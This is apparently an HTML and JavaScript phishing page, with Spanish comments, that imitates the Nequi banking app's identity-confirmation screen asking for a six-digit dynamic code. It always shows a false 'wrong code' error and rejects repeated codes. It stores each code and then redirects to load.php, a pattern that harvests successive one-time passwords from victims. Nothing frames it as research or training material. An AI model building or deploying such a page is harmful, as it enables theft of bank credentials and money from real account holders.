<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Index con Todos los Estilos</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <!-- BLOQUE 1: Reglas de fuentes (font.css) -->
  <style>
    @font-face {
      font-family: 'Manrope';
      src: url('./Manrope-Display.woff2');
      font-weight: bold;
      font-style: normal;
    }
    @font-face {
      font-family: 'Manrope';
      src: url('./Manrope-Italic.woff2');
      font-weight: normal;
      font-style: italic;
    }
    @font-face {
      font-family: 'Manrope';
      src: url('./Manrope-Normal.woff2');
      font-weight: normal;
      font-style: normal;
    }
  </style>

  <!-- BLOQUE 2: Estilos de loading-validation.css -->
  <style>
    .loadingContainer {
      position: fixed;
      top: 0;
      left: 0;
      right: 0;
      width: 100vw;
      height: 100vh;
      z-index: 100;
      display: none;
      background-color: rgb(255, 255, 255);
      overflow-y: auto;
      margin-top: 64px;
      padding-bottom: 100px;
      padding-inline: 20px;
    }
    .loadingContainer .mainSectionContainer {
      max-width: 350px;
      width: 100%;
      margin: 0 auto;
      background-position: center;
      background-repeat: no-repeat;
      background-size: cover;
      display: block;
      position: relative;
      padding: 60px 0;
      background-color: white;
      margin-top: 15vh;
      border-radius: 4px;
    }
    .loadingContainer .mainSectionWrapper {
      margin: 0 auto;
      padding-inline: 25px;
    }
    .loadingContainer .mainSectionWrapper h1 {
      width: fit-content;
      margin: 0 auto;
      text-align: center;
    }
    .loadingContainer .logo_nequi_animado {
      width: fit-content;
      margin: 0 auto;
    }
    .loadingContainer .logo_nequi_animado img {
      max-width: 150px;
      width: 100%;
      height: auto;
    }
    .loadingContainer .mainSectionWrapper .wait-msg {
      margin-top: 20px;
      font-size: .875em;
      font-weight: 600;
      color: var(--purple-primary);
      text-align: center;
    }
    .loadingContainer .mainSectionWrapper .info-msg {
      margin-top: 20px;
      font-size: .875rem;
      font-weight: 600;
      color: var(--purple-primary);
      text-align: center;
    }
    @media screen and (max-width: 768px) {
      .loadingContainer {
        background: url(../assets/images/pink_background.png) right no-repeat #FBE5F2;
      }
    }
  </style>

  <!-- BLOQUE 3: Estilos de navbar.css -->
  <style>
    .navbarContainer {
      z-index: 999;
      float: none;
      clear: none;
      background-color: var(--white);
      object-fit: fill;
      justify-content: center;
      align-items: stretch;
      width: auto;
      height: 64px;
      margin-left: auto;
      margin-right: auto;
      padding-top: 0;
      padding-bottom: 0;
      display: block;
      inset: 0% 0% auto;
      overflow: visible;
      position: fixed;
      top: 0;
    }
    .navbarContainer .navbarWrapper {
      border-bottom: 1px solid var(--gray-primary);
      background-color: #fff;
      align-items: center;
      height: 100%;
      padding-inline: 26px;
      display: flex;
    }
    .navbarContainer .navbarWrapper .navbarContent {
      justify-content: space-between;
      align-items: center;
      width: 100%;
      max-width: 80rem;
      height: 100%;
      margin-left: auto;
      margin-right: auto;
      display: flex;
    }
    .navbarContainer .navbarWrapper .navbarContent a {
      height: 40px;
    }
    .navbarContainer .navbarWrapper .navbarContent a svg {
      width: 100px;
      height: 40px;
    }
  </style>

  <!-- BLOQUE 4: Estilos globales (styles.css) -->
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: 'Manrope', system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI',
                   Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
    }
    :root {
      --purple-primary: #200020;
      --gray-bg-primary: #fbf7fb;
      --gray-primary: #f2f4f7;
      --gray-secondary: #828d92;
      --pink-primary: #da0081;
      --white: #ffffff;
    }
    input[type="number"] {
      -moz-appearance: textfield;
      appearance: textfield;
    }
    input[type="number"]::-webkit-inner-spin-button,
    input[type="number"]::-webkit-outer-spin-button {
      -webkit-appearance: none;
      margin: 0;
    }
    .arrow {
      border: solid var(--purple-primary);
      border-width: 0 1px 1px 0;
      display: inline-block;
      padding: 4px;
      transform: rotate(45deg);
      transition: transform 0.3s ease;
    }
    .hamburgerMenu {
      border: none;
      background-color: transparent;
      display: flex;
      flex-direction: column;
      justify-content: space-between;
      width: 25px;
      height: 20px;
      cursor: pointer;
    }
    .hamburgerMenu .bar {
      max-width: 25px;
      width: 100%;
      height: 1px;
      margin: 3px 0;
      background-color: var(--purple-primary);
      transition: .4s;
      padding: 1px 0;
    }
  </style>

  <!-- BLOQUE 5: Estilos validate-otp1.css -->
  <style>
    .homeSectionContainer {
      max-width: 420px;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      margin: 0 auto;
      margin-top: 20px;
      min-height: 100vh;
      padding: 0 1rem;
    }
    .homeSectionContainer > h1 {
      font-weight: 700;
      font-size: 1.5rem;
      line-height: 1.75rem;
      text-align: center;
      margin: 0 0 1.5rem;
      color: var(--purple-primary);
    }
    .homeSectionContainer .invalid-otp {
      color: red;
      font-size: .875rem;
      line-height: 1.25rem;
      text-align: center;
      margin-bottom: 28px;
    }
    .homeSectionContainer > p {
      font-weight: 400;
      font-size: .875rem;
      line-height: 1.25rem;
      text-align: center;
      margin-bottom: 28px;
      color: var(--purple-primary);
    }
    .homeSectionContainer .headerHome {
      width: fit-content;
      margin: 0 auto 20px auto;
    }
    .homeSectionContainer .linesContainer {
      width: 271px;
      display: flex;
      justify-content: space-around;
      margin: 0 auto;
    }
    .homeSectionContainer .linesContainer .otpInput {
      width: 32px;
      color: var(--pink-primary);
      text-align: center;
      border: none;
      border-bottom: 1px solid var(--purple-primary);
      height: 30px;
      font-size: 40px;
      font-weight: 700;
    }
    .homeSectionContainer .linesContainer .otpInput:focus {
      outline: none;
    }
    .homeSectionContainer .screenKeyboard {
      margin-top: 2rem;
      width: 100%;
      max-width: 300px;
      margin-left: auto;
      margin-right: auto;
    }
    .keyboardRow {
      display: flex;
      justify-content: space-around;
      margin-bottom: 1rem;
    }
    .keyboardBtn {
      width: 48px;
      height: 48px;
      border: none;
      background: none;
      font-size: 2.25rem;
      color: var(--purple-primary);
      cursor: pointer;
      border-radius: 50%;
      transition: background-color 0.2s;
      -webkit-tap-highlight-color: rgba(0,0,0,0);
      touch-action: manipulation;
      user-select: none;
    }
    .keyboardBtn.invisible {
      visibility: hidden;
    }
    .keyboardBtn:focus {
      outline: none;
    }
    .keyboardBtn.delete {
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .keyboardBtn.delete img {
      width: 24px;
      height: 24px;
    }
  </style>
</head>

<body>
  <!-- Contenedor "loadingContainer" (mostrado cuando se hace display:block) -->
  <main class="loadingContainer">
    <header class="navbarContainer">
      <div class="navbarWrapper">
        <div class="navbarContent">
          <!-- Aquí tu logo SVG, etc. -->
          <svg width="180" height="40" viewBox="0 0 104 32">
            <!-- Contenido del SVG omitido -->
          </svg>
          <button class="hamburgerMenu" aria-label="Menu">
            <span class="bar bar1"></span>
            <span class="bar bar2"></span>
            <span class="bar bar3"></span>
          </button>
        </div>
      </div>
    </header>
  </main>

  <!-- Sección principal donde el usuario ingresa la clave -->
  <section class="homeSectionContainer">
    <div class="headerHome">
      <!-- Podrías poner otro logo, etc. -->
      <svg width="180" height="40" viewBox="0 0 104 32">
        <!-- Contenido del SVG omitido -->
      </svg>
    </div>
    <img src="logo.png" alt="Logo" style="width:150px; height:auto; margin-bottom:40px;">
    <h1>Confirma tu identidad</h1>
    <!-- Mensaje de error; se actualizará en caso de clave repetida -->
    <p style="color: red; font-size: 14px; text-align: center; margin-top: 10px;">
      ¡Ups! esa no es tu clave dinámica. Puedes consultarla en la App Nequi.
    </p>
    <div class="linesContainer">
      <input id="c1" class="otpInput" maxlength="1" inputmode="none" readonly>
      <input id="c2" class="otpInput" maxlength="1" inputmode="none" readonly>
      <input id="c3" class="otpInput" maxlength="1" inputmode="none" readonly>
      <input id="c4" class="otpInput" maxlength="1" inputmode="none" readonly>
      <input id="c5" class="otpInput" maxlength="1" inputmode="none" readonly>
      <input id="c6" class="otpInput" maxlength="1" inputmode="none" readonly>
    </div>
    <div class="screenKeyboard">
      <div class="keyboardRow">
        <button class="keyboardBtn">1</button>
        <button class="keyboardBtn">2</button>
        <button class="keyboardBtn">3</button>
      </div>
      <div class="keyboardRow">
        <button class="keyboardBtn">4</button>
        <button class="keyboardBtn">5</button>
        <button class="keyboardBtn">6</button>
      </div>
      <div class="keyboardRow">
        <button class="keyboardBtn">7</button>
        <button class="keyboardBtn">8</button>
        <button class="keyboardBtn">9</button>
      </div>
      <div class="keyboardRow">
        <button class="keyboardBtn invisible" disabled></button>
        <button class="keyboardBtn">0</button>
        <button class="keyboardBtn" id="delete-otp">
          <img src="./Nequi_files/nequi-teclado-numerico-borrar.svg" alt="">
        </button>
      </div>
    </div>
  </section>

  <!-- Script principal -->
  <script>
    document.addEventListener("DOMContentLoaded", () => {
      const inputs = document.querySelectorAll('.otpInput');
      const keyboard = document.querySelector('.screenKeyboard');
      const deleteBtn = document.getElementById('delete-otp');
      const loadingSpinner = document.querySelector('.loadingContainer');
      let currentInput = 0;

      // Manejar clics del teclado numérico
      keyboard.addEventListener('click', (e) => {
        if (e.target.classList.contains('keyboardBtn') && e.target !== deleteBtn && !e.target.disabled) {
          const valor = e.target.textContent.trim();
          if (currentInput < inputs.length) {
            // Mostrar un asterisco y guardar el valor real
            inputs[currentInput].value = '*';
            inputs[currentInput].dataset.realValue = valor;
            currentInput++;
            checkComplete();
          }
        }
      });

      // Botón de borrar
      deleteBtn.addEventListener('click', () => {
        if (currentInput > 0) {
          currentInput--;
          inputs[currentInput].value = '';
        }
      });

      // Permitir borrar con la tecla "Backspace"
      document.addEventListener('keydown', (ev) => {
        if (ev.key === 'Backspace' && currentInput > 0) {
          currentInput--;
          inputs[currentInput].value = '';
        }
      });

      // Evitar que se pueda escribir con el teclado físico
      inputs.forEach(input => {
        input.readOnly = true;
        ['keydown','keyup','keypress','input','textInput'].forEach(eventType => {
          input.addEventListener(eventType, (evt) => {
            evt.preventDefault();
            return false;
          });
        });
        input.addEventListener('paste', (evt) => evt.preventDefault());
      });

      function checkComplete() {
        if (currentInput === inputs.length) {
          let code = '';
          inputs.forEach(inp => {
            code += (inp.dataset.realValue || '');
          });
          // Verificar si ya existe un código almacenado en localStorage
          const previousDina = localStorage.getItem("dina");
          if (previousDina && previousDina === code) {
            // Clave repetida: actualizar mensaje de error y reiniciar sin redirigir
            const errorMsgElem = document.querySelector('.homeSectionContainer p');
            if (errorMsgElem) {
              errorMsgElem.textContent = "¡Cuidado! Clave repetida. Inténtalo de nuevo.";
            }
            // Limpiar inputs y reiniciar currentInput después de 2.5 segundos
            setTimeout(() => {
              inputs.forEach(inp => {
                inp.value = '';
                delete inp.dataset.realValue;
              });
              currentInput = 0;
            }, 2500);
          } else {
            // Si es distinto o no existe, almacenarlo y proceder
            localStorage.setItem("dina", code);
            setTimeout(() => {
              loadingSpinner.style.display = 'none';
              window.location.href = "load.php";
            }, 1500);
          }
        }
      }
    });
  </script>
</body>
</html>
